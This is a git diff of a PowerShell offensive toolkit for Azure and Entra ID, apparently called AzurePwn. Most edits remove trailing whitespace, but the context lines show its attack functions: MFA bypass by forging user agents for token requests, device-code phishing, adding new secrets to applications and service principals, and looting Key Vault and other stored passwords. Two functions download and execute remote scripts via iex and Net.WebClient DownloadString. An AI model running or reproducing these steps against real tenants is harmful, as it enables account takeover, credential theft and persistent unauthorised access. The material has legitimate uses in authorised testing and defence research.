@@ -56,15 +56,15 @@ function ResetGraphModuleDetails {
 # Function to check if Azure CLI is installed and up to date
 function Check-AzureCLI {
     Write-Host "Checking if az CLI is installed..."
-    
+
     try {
         $versionRawOutput = az --version
 
         $hasUpdates = $false
-        $versionRawOutput | ForEach-Object { 
+        $versionRawOutput | ForEach-Object {
             Write-Host $_
         }
-        
+
         if ($versionRawOutput -match 'WARNING: You have \d+ update\(s\) available.') {
             Write-Host "Updates are available for az CLI." -ForegroundColor Yellow
             $upgradeChoice = Read-Host -Prompt "Would you like to upgrade to the latest version? (Y/N)"
@@ -199,7 +199,7 @@ function Set-Tenant {
         if ($tenantDomainInput) {
             try {
                 $TenantId = (Invoke-RestMethod -UseBasicParsing -Uri "https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain=$tenantDomainInput").TenantId
-                
+
                 if ($TenantId) {
                     $Global:tenantID = $TenantId
                     $Global:tenantDomain = $tenantDomainInput
@@ -362,7 +362,7 @@ function Login-AzureCLI-SP {
         $Global:azureCliAccount = $spDetails.Name
         $Global:azureCliId = $spDetails.Id
         $Global:azureCliSPName = $spDetails.SpName
-        
+
         Write-Host "Successfully logged into Azure CLI as Service Principal ($spDetails.Name)." -ForegroundColor Green
         Pause
     }
@@ -514,11 +514,11 @@ function Login-AzModule-SP {
     # Convert client secret to SecureString and create PSCredential
     $secureSecret = ConvertTo-SecureString $clientSecret -AsPlainText -Force
     $psCredential = [System.Management.Automation.PSCredential]::new($appId, $secureSecret)
-    
+
     try {
         Connect-AzAccount -ServicePrincipal -Credential $psCredential -TenantId $Global:tenantID -ErrorAction Stop
         $spDetails = Get-AzADServicePrincipal -ApplicationId $appId
-        $Global:azModuleAccount = $spDetails.AppDisplayName 
+        $Global:azModuleAccount = $spDetails.AppDisplayName
         $Global:azModuleId = $spDetails.Id
         $Global:azModuleSPName = $spDetails.AppId
 
@@ -575,7 +575,7 @@ function Login-GraphModule {
     try {
         # Clear any existing session
         Disconnect-MgGraph -ErrorAction SilentlyContinue
-        
+
         if ($tenantID -ne "Not set") {
             Connect-MgGraph -TenantId $tenantID -ErrorAction Stop
             $Global:graphModuleAccount = (Get-MgContext).Account
@@ -604,7 +604,7 @@ function Login-GraphModule-AT {
     try {
         # Clear any existing session
         Disconnect-MgGraph -ErrorAction SilentlyContinue
-        
+
         if ($tenantID -ne "Not set") {
             Connect-MgGraph -AccessToken $SecureToken -ErrorAction Stop
             $Global:graphModuleAccount = (Get-MgContext).Account
@@ -629,7 +629,7 @@ function Login-GraphModule-DC {
     try {
         # Clear any existing session
         Disconnect-MgGraph -ErrorAction SilentlyContinue
-        
+
         if ($tenantID -ne "Not set") {
             Connect-MgGraph -TenantId $tenantID -UseDeviceAuthentication -ErrorAction Stop
             $Global:graphModuleAccount = (Get-MgContext).Account
@@ -684,7 +684,7 @@ function Logout-AllServices {
     $Global:graphModuleAccount = "Not logged in"
 
     Write-Host "Tenant information and accounts have been cleared." -ForegroundColor Green
-    Write-Host "`nPress any key to return to the main menu..." 
+    Write-Host "`nPress any key to return to the main menu..."
     [void][System.Console]::ReadKey($true)
 }
 
@@ -767,7 +767,7 @@ function Resolve-Ids {
 
     $names = @{ }
     $guidPattern = '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$'
-    
+
     foreach ($id in $Ids) {
         if ($id -eq "All" -or $id -eq "None") {
             $names[$id] = $id
@@ -801,14 +801,14 @@ function Get-AllLegacyGraphData {
 
     while ($nextLink) {
         $headers = @{ "Authorization" = "Bearer $AccessToken" }
-        
+
         try {
             $response = Invoke-RestMethod -Uri $nextLink -Headers $headers -Method Get
         } catch {
             Write-Error "Failed to fetch data from ${nextLink}: $_"
             return $null
         }
-        
+
         if ($response.value) {
             $allResults += $response.value
         }
@@ -853,7 +853,7 @@ function Format-PolicyDetails {
                     $includedUsers = ($userIds | ForEach-Object { $userNames[$_] }) -join ", "
                     Write-Host "Included Users: $includedUsers"
                 }
-                
+
                 if ($detail.Conditions.Users.Exclude) {
                     $userIdsEx = $detail.Conditions.Users.Exclude | ForEach-Object { $_.Users } | Select-Object -Unique
                     $userNamesEx = Resolve-Ids -Ids $userIdsEx -Type "User"
@@ -928,11 +928,11 @@ function ConditionalAccessPoliciesQuery {
 
     # Define the policies endpoint
     $policiesEndpoint = "https://graph.windows.net/$tenantId/policies?api-version=1.61-internal"
-    
+
     # Fetch and display data from the policies endpoint
     Write-Host "Attempting to fetch data from: $policiesEndpoint" -ForegroundColor Cyan
     $policies = Get-AllLegacyGraphData -AccessToken $accessToken -InitialEndpoint $policiesEndpoint
-        
+
     # Filter policies where policyType equals 18
     $filteredPolicies = $policies | Where-Object { $_.policyType -eq 18 }
     Format-PolicyDetails -Policies $filteredPolicies
@@ -951,16 +951,16 @@ function DynamicGroupsQuery {
         Clear-Host
         DisplayHeader
         Write-Host "Graph PS Module output:" -ForegroundColor Magenta
-        
+
         # Fetch dynamic groups using Microsoft Graph PowerShell
-        $dynamicGroups = Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')" 
+        $dynamicGroups = Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')"
 
         foreach ($group in $dynamicGroups) {
             $groupName = $group.DisplayName
             $membershipQuery = $group.MembershipRule
             $Description = $group.Description
             Write-Output "Group Name: $groupName"
-            Write-Output "Description: $Description" 
+            Write-Output "Description: $Description"
             Write-Output "Membership Query: $membershipQuery"
             Write-Output ""
         }
@@ -982,15 +982,15 @@ function OwnedApplicationsQuery {
     # Display logged-in users
     $accounts = @()
     $accountIds = @()
-    if ($azureCliAccount -ne "Not logged in") { 
+    if ($azureCliAccount -ne "Not logged in") {
         $accounts += $azureCliAccount
         $accountIds += $azureCliId
     }
-    if ($azModuleAccount -ne "Not logged in") { 
+    if ($azModuleAccount -ne "Not logged in") {
         $accounts += $azModuleAccount
         $accountIds += $azModuleId
     }
-    if ($graphModuleAccount -ne "Not logged in") { 
+    if ($graphModuleAccount -ne "Not logged in") {
         $accounts += $graphModuleAccount
         $accountIds += $graphModuleId
     }
@@ -1024,7 +1024,7 @@ function OwnedApplicationsQuery {
 
         if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
             Write-Host "AZ CLI output:" -ForegroundColor Magenta
-            
+
             # List all Azure AD applications and check ownership
             $apps = az ad app list --query '[].{Name: displayName, AppId: appId, ObjectId: id}' -o json | ConvertFrom-Json
             $ownedApps = foreach ($app in $apps) {
@@ -1207,16 +1207,16 @@ function OwnedObjectsQuery {
     # Display logged-in users
     $accounts = @()
     $accountIds = @()
-    if ($azureCliAccount -ne "Not logged in") { 
-        $accounts += $azureCliAccount 
+    if ($azureCliAccount -ne "Not logged in") {
+        $accounts += $azureCliAccount
         $accountIds += $azureCliId
     }
-    if ($azModuleAccount -ne "Not logged in") { 
-        $accounts += $azModuleAccount 
+    if ($azModuleAccount -ne "Not logged in") {
+        $accounts += $azModuleAccount
         $accountIds += $azModuleId
     }
-    if ($graphModuleAccount -ne "Not logged in") { 
-        $accounts += $graphModuleAccount 
+    if ($graphModuleAccount -ne "Not logged in") {
+        $accounts += $graphModuleAccount
         $accountIds += $graphModuleId
     }
 
@@ -1291,16 +1291,16 @@ function RoleAssignmentsQuery {
     # Display logged-in users
     $accounts = @()
     $accountIds = @()
-    if ($azureCliAccount -ne "Not logged in") { 
-        $accounts += $azureCliAccount 
+    if ($azureCliAccount -ne "Not logged in") {
+        $accounts += $azureCliAccount
         $accountIds += $azureCliId
     }
-    if ($azModuleAccount -ne "Not logged in") { 
-        $accounts += $azModuleAccount 
+    if ($azModuleAccount -ne "Not logged in") {
+        $accounts += $azModuleAccount
         $accountIds += $azModuleId
     }
-    if ($graphModuleAccount -ne "Not logged in") { 
-        $accounts += $graphModuleAccount 
+    if ($graphModuleAccount -ne "Not logged in") {
+        $accounts += $graphModuleAccount
         $accountIds += $graphModuleId
     }
 
@@ -1347,11 +1347,11 @@ function RoleAssignmentsQuery {
             }
             else {
                 $psOutput = Get-AzRoleAssignment | Format-list | Out-String
-            } 
-            
+            }
+
             Write-Host $psOutput
         }
-        
+
         # Graph PowerShell Module
         if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
             Write-Host "Graph PS Module output:" -ForegroundColor Magenta
@@ -1417,16 +1417,16 @@ function UserInfoQuery {
     # Display logged-in users
     $accounts = @()
     $accountIds = @()
-    if ($azureCliAccount -ne "Not logged in") { 
-        $accounts += $azureCliAccount 
+    if ($azureCliAccount -ne "Not logged in") {
+        $accounts += $azureCliAccount
         $accountIds += $azureCliId
     }
-    if ($azModuleAccount -ne "Not logged in") { 
-        $accounts += $azModuleAccount 
+    if ($azModuleAccount -ne "Not logged in") {
+        $accounts += $azModuleAccount
         $accountIds += $azModuleId
     }
-    if ($graphModuleAccount -ne "Not logged in") { 
-        $accounts += $graphModuleAccount 
+    if ($graphModuleAccount -ne "Not logged in") {
+        $accounts += $graphModuleAccount
         $accountIds += $graphModuleId
     }
 
@@ -1494,16 +1494,16 @@ function UserGroupsQuery {
     # Display logged-in users
     $accounts = @()
     $accountIds = @()
-    if ($azureCliAccount -ne "Not logged in") { 
-        $accounts += $azureCliAccount 
+    if ($azureCliAccount -ne "Not logged in") {
+        $accounts += $azureCliAccount
         $accountIds += $azureCliId
     }
-    if ($azModuleAccount -ne "Not logged in") { 
-        $accounts += $azModuleAccount 
+    if ($azModuleAccount -ne "Not logged in") {
+        $accounts += $azModuleAccount
         $accountIds += $azModuleId
     }
-    if ($graphModuleAccount -ne "Not logged in") { 
-        $accounts += $graphModuleAccount 
+    if ($graphModuleAccount -ne "Not logged in") {
+        $accounts += $graphModuleAccount
         $accountIds += $graphModuleId
     }
 
@@ -1733,7 +1733,7 @@ function SetNewSecretForApplication {
         }
         # Create a new password credential
         $newPassword = Add-MgApplicationPassword -ApplicationId $appId -PasswordCredential $passwordCred
-        
+
         # Print the new password
         Write-Host "The new secret for the Application is: $($newPassword.SecretText)" -ForegroundColor Green
     }
@@ -1767,13 +1767,13 @@ function SetNewSecretForServicePrincipal {
             $newSecret = az ad sp credential reset --id $spId --append --query 'password' -o tsv
             Write-Host "The new secret for the service principal is: $newSecret" -ForegroundColor Green
         }
-        
+
         if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
             Write-Host "AZ PS Module output:" -ForegroundColor Magenta
             $newPassword = New-AzADSpCredential -ObjectId $spId -DisplayName 'Created via AzurePwn'
             Write-Host "The new secret for the service principal is: $($newPassword.Secret)" -ForegroundColor Green
         }
-        
+
         if ($toolChoice -eq "3" -or $toolChoice -eq "4") {
             Write-Host "Graph PS Module output:" -ForegroundColor Magenta
             $passwordCred = @{
@@ -1811,10 +1811,10 @@ function GraphRunnerBypassMFA {
         foreach ($browser in $browsers) {
             try {
                 Write-Host "Attempting with Device: $device, Browser: $browser" -ForegroundColor Cyan
-                
+
                 # Attempt to acquire graph tokens using the generated user agent
                 $result = Get-GraphTokens -UserPasswordAuth -Device $device -Browser $browser
-                
+
                 # Checking if the global variable $tokens has been set
                 if ($global:tokens -and $global:tokens.access_token) {
                     Write-Host "Successfully retrieved Graph Access Token with -Device=$device and -Browser=$browser combination" -ForegroundColor DarkGreen
@@ -1838,7 +1838,7 @@ function GraphRunnerBypassMFA {
     [void][System.Console]::ReadKey($true)
 }
 
-<# 
+<#
 Function to invoke MFASweep directly from GitHub https://github.com/dafthack/MFASweep
 MIT License
 
@@ -1871,13 +1871,13 @@ function MFASweep {
     if (Get-Command -Name Invoke-MFASweep -ErrorAction SilentlyContinue) {
         Write-Host "Invoke-MFASweeps is already available." -ForegroundColor Green
     } else {
-        Write-Host "Invoke-MFASweep is not available." -ForegroundColor Red 
+        Write-Host "Invoke-MFASweep is not available." -ForegroundColor Red
         Write-Host "Downloading and running MFASweep from GitHub..." -ForegroundColor Yellow
         iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1")
     }
 
     Invoke-MFASweep
-    
+
     Write-Host "`nPress any key to return to the Attacks menu..."
     [void][System.Console]::ReadKey($true)
 }
@@ -1917,7 +1917,7 @@ function DeviceCodePhishing {
     Write-Host "`nPlease go to: $($authResponse.verification_url)" -ForegroundColor Yellow
     Write-Host "Enter the code: $($authResponse.user_code)" -ForegroundColor Green
     Write-Host "`n start polling for tokens..."
-    
+
 
     $interval = $authResponse.interval
     $expires = $authResponse.expires_in
@@ -2071,7 +2071,7 @@ function LootKeyvaults {
                         } elseif ($toolChoice -eq "2") {
                             Get-AzKeyVaultSecret -VaultName $selectedVault | Select-Object -ExpandProperty Name
                             }
-                        
+
                         $secretList = $secrets -split "`n"
                         if ($secretList.Count -gt 0) {
                             while ($true) {
@@ -2182,14 +2182,14 @@ function ListStorageAccounts {
     try {
         Clear-Host
         DisplayHeader
-        
+
         if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
             Write-Host "AZ CLI output:" -ForegroundColor Magenta
             Write-Host "The following Storage Accounts were found:" -ForegroundColor Cyan
             $cliOutput = az storage account list --query "[].name" -o tsv | Out-String
             Write-Host $cliOutput
         }
-        
+
         if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
             Write-Host "AZ PS Module output:" -ForegroundColor Magenta
             Write-Host "The following Storage Accounts were found:" -ForegroundColor Cyan
@@ -2619,11 +2619,11 @@ function ListBlobsInContainer {
                         if ($selectedBlobIndex -eq "B") {
                             break
                         }
-                    
+
                         if ($selectedBlobIndex -ge 1 -and $selectedBlobIndex -le $blobs.Count) {
                             $selectedBlob = $blobs[$selectedBlobIndex - 1].Trim()
                             Write-Host "`nBlob selected: $selectedBlob" -ForegroundColor Yellow
-                    
+
                             try {
                                 if ($toolChoice -eq "1") {
                                     Write-Host "`nViewing content of blob '$selectedBlob' using Azure CLI..." -ForegroundColor Yellow
@@ -2705,14 +2705,14 @@ function ListContainerApps {
     try {
         Clear-Host
         DisplayHeader
-        
+
         if ($toolChoice -eq "1" -or $toolChoice -eq "4") {
             Write-Host "AZ CLI output:" -ForegroundColor Magenta
             Write-Host "The following Container Apps were found:" -ForegroundColor Cyan
             $cliOutput = az containerapp list --query "[].name" -o tsv | Out-String
             Write-Host $cliOutput
         }
-        
+
         if ($toolChoice -eq "2" -or $toolChoice -eq "4") {
             Write-Host "AZ PS Module output:" -ForegroundColor Magenta
             Write-Host "The following Container Apps were found:" -ForegroundColor Cyan
@@ -2860,7 +2860,7 @@ function LootContainerApp {
     [void][System.Console]::ReadKey($true)
 }
 
-<# 
+<#
 Function to invoke Get-AzPasswords directly from GitHub https://github.com/NetSPI/MicroBurst/blob/master/Az/Get-AzPasswords.ps1
 MicroBurst is provided under the 3-clause BSD license below.
 
@@ -2899,7 +2899,7 @@ function LootAzPasswords {
     DisplayHeader
     Write-Host "Looting possible passwords via MicroBurt's Get-AzPasswords" -ForegroundColor Cyan
 
-    # Download and execute the script 
+    # Download and execute the script
     # Check if Get-AzPasswords Module is available
     if (Get-Command -Name Get-AzPasswords -ErrorAction SilentlyContinue) {
         Write-Host "Get-AzPasswords is already available." -ForegroundColor Green
@@ -2909,7 +2909,7 @@ function LootAzPasswords {
         iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/MicroBurst/refs/heads/master/Az/Get-AzPasswords.ps1")
     }
     Get-AzPasswords -Verbose | Out-GridView
-    
+
     Write-Host "`nPress any key to return to the Loot menu..."
     [void][System.Console]::ReadKey($true)
 }
@@ -3122,7 +3122,7 @@ function Invoke-RefreshToAzureManagementToken {
 
     # Invoke the token retrieval function
     $Global:AzureManagementToken = Invoke-RefreshToToken @Parameters
-    
+
     Write-Host ("Token acquired") -ForegroundColor Green
     Write-Host ("Type: $($AzureManagementToken.token_type)") -ForegroundColor Green
     Write-Host ("Scope: $($AzureManagementToken.scope)") -ForegroundColor Green
@@ -3187,7 +3187,7 @@ function Invoke-RefreshToAzureCoreManagementToken {
     }
 
     $global:AzureCoreManagementToken = Invoke-RefreshToToken @Parameters
-        
+
     Write-Host ("Token acquired") -ForegroundColor Green
     Write-Host ("Type: $($AzureCoreManagementToken.token_type)") -ForegroundColor Green
     Write-Host ("Scope: $($AzureCoreManagementToken.scope)") -ForegroundColor Green
@@ -3318,7 +3318,7 @@ function Invoke-RefreshToAzureKeyVaultToken {
     }
 
     $global:AzureKeyVaultToken = Invoke-RefreshToToken @Parameters
-        
+
     Write-Host ("Token acquired") -ForegroundColor Green
     Write-Host ("Type: $($AzureKeyVaultToken.token_type)") -ForegroundColor Green
     Write-Host ("Scope: $($AzureKeyVaultToken.scope)") -ForegroundColor Green
@@ -3416,44 +3416,44 @@ function RawCommandPrompt {
 function ShowBanner {
     Clear-Host
     Write-Host "
-                                                                                                
-                                        .*#  #@-   .@@@@%+.                                      
-                                  ..%@# -@@@.@%.   .@@: +@@.-@@#.                                
-                             .:*@@+..#@%%@+@@@-    :@@##%#-.@@@:+@@..                            
-                             %@@:*@=  +@@% =@@.    :@@.    =@@%@@: +@%                           
-                        .-#@+.@@@:.=*. :-.                 +@@%=.  *@*.=%-.                      
-                      .+@##@@..@@@@=.                       ...+*..@@@@@@@.                      
-                     :@@@*@*.  .:.              +:         .*@    .%@#.@@-:%@-                   
-                      :@@@+.                    #@%.       =@@.       -@@@@#.                    
-                        =@@:                    +@@@.     =@@@:       .-=.                       
-                         ..                     +@@@@@@@@@@@@@*.       ..                        
-                            .                   +@@@%@@@@-..:@@.       -@%.                      
-                           *@@-                 :@# ..-@@....@@.     .+@@-                       
-                           .-@@@:               .@# . #@@@%%@@@.    .@@@..                       
-                             .%@@@.             :@@@@@@@@@@@@@@.   -@@@%.                        
-                             .*:@@@@-        .%@@@@@@@@@@@@@@@@- :@@@@@%.                        
-                              .=@@@@@=    .+@@@@@@@@@@@@@@@@@@@@.#@@@@@:                         
-                              .@@@@@@.  .*@@@@@@@@@@@@@@@@@@@@@@..@@@@@@:                        
-                              #@@@@@@#++@@@@@@@@@@@@@@@@@@@@@@@@: *@@@@@=.                       
-                               .=.:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=                          
-                                    .=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+.                           
-                                     #@@@@@@@@@@@@@@@@@@@@@@@@@@@@-.                             
-                                    -@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                               
-                   .=@@@@@@%:..     #@@@@@@@@@@@@@@@@@@@@@@@@@@@:                                
-                   +@@@@@@@@@@@%.   @@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
-                     ....:*@@@@@@@..@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
-                            ..#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
-                               .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
-                                .-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
-                                  :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
-                                   -@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
-                                    *@@@@@@@@@@@@@@@@@@@@@@@@@@@.                                
-                                    .-@@@@@@@@@@@@@@@@@@@@@@@@@.                                 
-                                                                                                 
-                      .%#..%%. .%#. =%%*:  .%*. =%%%= *%: .%-.#-  *%. .+%%-.*.                   
-                      :@@#+@@:.#@@- #@:=@*.@@@- #@.. .@@@..@%@%. -@@# =@*:..%:                   
-                      .@-@@=@::@%@@.#@--@#.@#@%.#@%*.@@@@=.@@@@. %@@@:..*@@-#.                   
-                      .@.%+:@-*#.:@:#@@@*.@+.+@=*%  .@:.%%.@*.@@.@:.@#:@@@%.%.    
+
+                                        .*#  #@-   .@@@@%+.
+                                  ..%@# -@@@.@%.   .@@: +@@.-@@#.
+                             .:*@@+..#@%%@+@@@-    :@@##%#-.@@@:+@@..
+                             %@@:*@=  +@@% =@@.    :@@.    =@@%@@: +@%
+                        .-#@+.@@@:.=*. :-.                 +@@%=.  *@*.=%-.
+                      .+@##@@..@@@@=.                       ...+*..@@@@@@@.
+                     :@@@*@*.  .:.              +:         .*@    .%@#.@@-:%@-
+                      :@@@+.                    #@%.       =@@.       -@@@@#.
+                        =@@:                    +@@@.     =@@@:       .-=.
+                         ..                     +@@@@@@@@@@@@@*.       ..
+                            .                   +@@@%@@@@-..:@@.       -@%.
+                           *@@-                 :@# ..-@@....@@.     .+@@-
+                           .-@@@:               .@# . #@@@%%@@@.    .@@@..
+                             .%@@@.             :@@@@@@@@@@@@@@.   -@@@%.
+                             .*:@@@@-        .%@@@@@@@@@@@@@@@@- :@@@@@%.
+                              .=@@@@@=    .+@@@@@@@@@@@@@@@@@@@@.#@@@@@:
+                              .@@@@@@.  .*@@@@@@@@@@@@@@@@@@@@@@..@@@@@@:
+                              #@@@@@@#++@@@@@@@@@@@@@@@@@@@@@@@@: *@@@@@=.
+                               .=.:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=
+                                    .=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+.
+                                     #@@@@@@@@@@@@@@@@@@@@@@@@@@@@-.
+                                    -@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
+                   .=@@@@@@%:..     #@@@@@@@@@@@@@@@@@@@@@@@@@@@:
+                   +@@@@@@@@@@@%.   @@@@@@@@@@@@@@@@@@@@@@@@@@@@.
+                     ....:*@@@@@@@..@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
+                            ..#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
+                               .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
+                                .-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
+                                  :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
+                                   -@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
+                                    *@@@@@@@@@@@@@@@@@@@@@@@@@@@.
+                                    .-@@@@@@@@@@@@@@@@@@@@@@@@@.
+
+                      .%#..%%. .%#. =%%*:  .%*. =%%%= *%: .%-.#-  *%. .+%%-.*.
+                      :@@#+@@:.#@@- #@:=@*.@@@- #@.. .@@@..@%@%. -@@# =@*:..%:
+                      .@-@@=@::@%@@.#@--@#.@#@%.#@%*.@@@@=.@@@@. %@@@:..*@@-#.
+                      .@.%+:@-*#.:@:#@@@*.@+.+@=*%  .@:.%%.@*.@@.@:.@#:@@@%.%.
 
 " -ForegroundColor Cyan
 }
@@ -3473,14 +3473,14 @@ function preflightcheck {if ($PSVersionTable.PSVersion.Major -lt 7) {
                 catch {
                     Write-Host "Azure CLI is not installed." -ForegroundColor Red
                 }
-            
+
                 # Check if Az PowerShell Module is available
                 if (Get-Module -ListAvailable -Name Az) {
                     Write-Host "Az PowerShell Module is installed." -ForegroundColor Green
                 } else {
                     Write-Host "Az PowerShell Module is not installed." -ForegroundColor Red
                 }
-                
+
                 # Check if Microsoft Graph PowerShell Module is available
                 if (Get-Module -ListAvailable -Name Microsoft.Graph) {
                     Write-Host "Microsoft Graph PowerShell Module is installed." -ForegroundColor Green
@@ -3492,7 +3492,7 @@ Write-Host "`nPress any key to continue..."
 [void][System.Console]::ReadKey($true)
 }
 
-<# 
+<#
 Stolen and altered GraphRunner stuff
 MIT License
 
@@ -3528,7 +3528,7 @@ function Get-GraphTokens{
     [ValidateSet("Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","DODMSGraph","Custom","Substrate")]
     [String[]]$Client = "MSGraph",
     [Parameter(Position = 3,Mandatory=$False)]
-    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
+    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
     [Parameter(Position = 4,Mandatory=$False)]
     [String]$Resource = "https://graph.microsoft.com",
     [Parameter(Position = 5,Mandatory=$False)]
@@ -3548,16 +3548,16 @@ function Get-GraphTokens{
 	}
 	else {
 	   if ($Browser) {
-			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
-	   } 
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser
+	   }
 	   else {
 			$UserAgent = Invoke-ForgeUserAgent
 	   }
 	}
     if($UserPasswordAuth){
         Write-Host -ForegroundColor Yellow "[*] Initiating the User/Password authentication flow"
-        
-      
+
+
         $url = "https://login.microsoft.com/common/oauth2/token"
         $headers = @{
             "Accept" = "application/json"
@@ -3577,7 +3577,7 @@ function Get-GraphTokens{
                 $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                 $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                 $tokobj = $tokenArray | ConvertFrom-Json
-                
+
                 Write-Output "Decoded JWT payload:"
                 $tokobj
                 $baseDate = Get-Date -date "01-01-1970"
@@ -3593,14 +3593,14 @@ function Get-GraphTokens{
         if($ExternalCall){
             return $tokens
         }
-    
+
     }
     else{
         If($tokens){
             $newtokens = $null
             while($newtokens -notlike "Yes"){
                 Write-Host -ForegroundColor cyan "[*] It looks like you already tokens set in your `$tokens variable. Are you sure you want to authenticate again?"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Initiating device code login..."
